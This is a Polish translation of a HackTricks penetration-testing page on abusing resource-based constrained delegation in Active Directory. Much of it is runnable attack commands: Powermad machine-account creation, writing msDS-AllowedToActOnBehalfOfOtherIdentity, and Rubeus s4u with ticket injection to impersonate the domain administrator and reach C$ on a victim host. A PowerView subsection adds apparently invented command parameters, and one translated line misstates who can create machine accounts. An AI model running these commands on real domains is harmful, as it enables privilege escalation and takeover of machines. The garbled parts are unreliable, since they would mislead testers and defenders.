# Ograniczenie delegacji opartej na zasobach

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawy ograniczenia delegacji opartej na zasobach

Jest to podobne do podstawowego [Ograniczenia delegacji](constrained-delegation.md), ale **zamiast** udzielania uprawnień **obiektowi** do **udawania dowolnego użytkownika wobec usługi**. Ograniczenie delegacji opartej na zasobach **ustawia w obiekcie, kto może udawać dowolnego użytkownika wobec niego**.

W tym przypadku obiekt o ograniczonej delegacji będzie miał atrybut o nazwie _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ z nazwą użytkownika, który może udawać dowolnego innego użytkownika wobec niego.

Inną istotną różnicą w tej delegacji ograniczonej w porównaniu do innych delegacji jest to, że każdy użytkownik z **uprawnieniami do zapisu na koncie komputera** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) może ustawić _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (w innych formach delegacji wymagane są uprawnienia administratora domeny).

### Nowe pojęcia

W przypadku Ograniczenia delegacji powiedziano, że flaga **`TrustedToAuthForDelegation`** wewnątrz wartości _userAccountControl_ użytkownika jest potrzebna do wykonania **S4U2Self**. Ale to nie jest całkowita prawda.\
Rzeczywistość jest taka, że nawet bez tej wartości można wykonać **S4U2Self** wobec dowolnego użytkownika, jeśli jesteś **usługą** (masz SPN), ale jeśli **masz `TrustedToAuthForDelegation`**, zwrócony TGS będzie **przekazywalny**, a jeśli **nie masz** tej flagi, zwrócony TGS **nie** będzie **przekazywalny**.

Jednak jeśli używany w **S4U2Proxy** **TGS** jest **NIE przekazywalny**, próba wykorzystania **podstawowego ograniczenia delegacji** **nie zadziała**. Ale jeśli próbujesz wykorzystać **delegację opartą na zasobach, zadziała** (to nie jest podatność, to funkcja, najwyraźniej).

### Struktura ataku

> Jeśli masz **uprawnienia równoważne zapisowi** na koncie **komputera**, możesz uzyskać **uprzywilejowany dostęp** do tego komputera.

Załóżmy, że atakujący ma już **uprawnienia równoważne zapisowi na komputerze ofiary**.

1. Atakujący **kompromituje** konto, które ma **SPN**, lub **tworzy je** ("Usługa A"). Zauważ, że **dowolny** _Użytkownik Administratora_ bez żadnych innych specjalnych uprawnień może **utworzyć** do 10 **obiektów komputera (**_**MachineAccountQuota**_**)** i ustawić im SPN. Atakujący może po prostu utworzyć obiekt komputera i ustawić SPN.
2. Atakujący **wykorzystuje swoje uprawnienia DO ZAPISU** na komputerze ofiary (Usługa B), aby skonfigurować **ograniczenie delegacji opartej na zasobach, które pozwala Usłudze A na udawanie dowolnego użytkownika** wobec tego komputera ofiary (Usługa B).
3. Atakujący używa narzędzia Rubeus do przeprowadzenia **pełnego ataku S4U** (S4U2Self i S4U2Proxy) z Usługi A do Usługi B dla użytkownika **z uprzywilejowanym dostępem do Usługi B**.
1. S4U2Self (z kompromitowanego/utworzonego konta SPN): Żądanie **TGS Administratora dla mnie** (Nieprzekazywalne).
2. S4U2Proxy: Użyj **nieprzekazywalnego TGS** z poprzedniego kroku, aby poprosić o **TGS** od **Administratora** do **komputera ofiary**.
3. Nawet jeśli używasz nieprzekazywalnego TGS, ponieważ wykorzystujesz ograniczenie delegacji opartej na zasobach, zadziała to.
4. Atakujący może **przekazać bilet** i **udawać** użytkownika, aby uzyskać **dostęp do Usługi B ofiary**.

Aby sprawdzić _**MachineAccountQuota**_ domeny, można użyć:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Atak

### Tworzenie obiektu komputera

Możesz utworzyć obiekt komputera wewnątrz domeny przy użyciu [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurowanie ograniczonego przekazywania opartego na zasobach

**Z użyciem modułu PowerShell activedirectory**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Używanie powerview**

Powerview to potężne narzędzie do eksploracji i manipulacji środowiskiem Active Directory. Może być używane do przeprowadzania ataków związanych z delegacją opartą na zasobach. Poniżej przedstawiono kilka przykładów użycia powerview w celu wykorzystania delegacji opartej na zasobach.

1. **Sprawdzanie uprawnień delegacji**: Aby sprawdzić, czy dana usługa lub konto ma uprawnienia do delegacji, można użyć polecenia `Get-DomainUser` lub `Get-DomainGroup` w powerview. Przykład:

   ```
   Get-DomainUser -Identity <nazwa_konta>
   ```

2. **Zmiana uprawnień delegacji**: Aby zmienić uprawnienia delegacji dla danego konta, można użyć polecenia `Set-DomainObject` w powerview. Przykład:

   ```
   Set-DomainObject -Identity <nazwa_konta> -AddAllowedToDelegateTo <nazwa_konta_docelowego>
   ```

3. **Wykorzystywanie delegacji opartej na zasobach**: Aby wykorzystać delegację opartą na zasobach, można użyć polecenia `Invoke-UserImpersonation` w powerview. Przykład:

   ```
   Invoke-UserImpersonation -SamAccountName <nazwa_konta> -DelegateTo <nazwa_konta_docelowego> -Command <polecenie_do_wykonania>
   ```

   Ten atak pozwala na wykonanie polecenia jako użytkownik, który ma uprawnienia do delegacji na danym koncie.

4. **Zabezpieczanie przed atakami związanymi z delegacją**: Aby zabezpieczyć się przed atakami związanymi z delegacją, należy regularnie monitorować uprawnienia delegacji, ograniczać uprawnienia tylko do niezbędnych kont i usług oraz stosować zasady minimalnego dostępu.

   Przykład:

   - Ograniczanie uprawnień delegacji tylko do niezbędnych kont i usług.
   - Regularne sprawdzanie i usuwanie niepotrzebnych uprawnień delegacji.
   - Używanie zasad minimalnego dostępu do zasobów.

   Te środki ostrożności pomogą w minimalizacji ryzyka ataków związanych z delegacją opartą na zasobach w środowisku Active Directory.
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Wykonanie pełnego ataku S4U

Po pierwsze, tworzymy nowy obiekt Komputera z hasłem `123456`, więc potrzebujemy skrótu tego hasła:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
To wydrukuje hashe RC4 i AES dla tego konta.\
Teraz można przeprowadzić atak:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Możesz wygenerować więcej biletów, pytając tylko raz, używając parametru `/altservice` w Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Zauważ, że użytkownicy mają atrybut o nazwie "**Nie można przekazywać**". Jeśli użytkownik ma ten atrybut ustawiony na True, nie będziesz w stanie podszyć się pod niego. Właściwość tę można zobaczyć w narzędziu BloodHound.
{% endhint %}

### Uzyskiwanie dostępu

Ostatnia linia poleceń przeprowadzi **pełny atak S4U i wstrzyknie TGS** z konta Administratora do hosta ofiary w **pamięci**.\
W tym przykładzie został żądany TGS dla usługi **CIFS** od Administratora, więc będziesz mógł uzyskać dostęp do **C$**.
```bash
ls \\victim.domain.local\C$
```
### Wykorzystywanie różnych biletów usług

Dowiedz się więcej na temat [**dostępnych biletów usług tutaj**](silver-ticket.md#dostępne-usługi).

## Błędy Kerberosa

* **`KDC_ERR_ETYPE_NOTSUPP`**: Oznacza to, że Kerberos jest skonfigurowany tak, aby nie używać DES ani RC4, a ty dostarczasz tylko skrót RC4. Dostarcz Rubeusowi co najmniej skrót AES256 (lub dostarcz mu skróty rc4, aes128 i aes256). Przykład: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Oznacza to, że czas bieżącego komputera różni się od czasu kontrolera domeny i Kerberos nie działa poprawnie.
* **`preauth_failed`**: Oznacza to, że podane nazwa użytkownika + skróty nie działają do logowania. Możliwe, że zapomniałeś umieścić "$" wewnątrz nazwy użytkownika podczas generowania skrótów (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Może to oznaczać:
* Użytkownik, którego próbujesz podrobić, nie ma dostępu do żądanej usługi (ponieważ nie możesz go podrobić lub nie ma wystarczających uprawnień)
* Żądana usługa nie istnieje (jeśli prosisz o bilet dla winrm, ale winrm nie jest uruchomiony)
* Utworzony fałszywy komputer utracił uprawnienia do podatnego serwera i musisz je przywrócić.

## Odwołania

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><strong>Dowiedz się o hakowaniu AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
